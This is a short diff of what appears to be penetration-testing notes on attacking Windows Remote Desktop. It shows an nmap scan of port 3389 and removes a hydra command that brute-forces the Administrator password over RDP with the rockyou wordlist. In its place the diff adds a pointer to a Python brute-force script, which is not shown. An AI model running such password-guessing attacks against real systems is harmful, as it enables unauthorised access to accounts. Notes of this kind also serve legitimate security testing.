@@ -71,17 +71,10 @@ nmap -p 3389 <target_ip>
 
 RDP Brute-Force
 
-Use hydra:
-
-hydra -t 32 -vV -f -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://<window ip>
-
-
-Or use the Python script below.
+use the Python script automation available in code section
+bruteforce password faster.
 
 
----
-
-Python Script
 
 Run with:
 
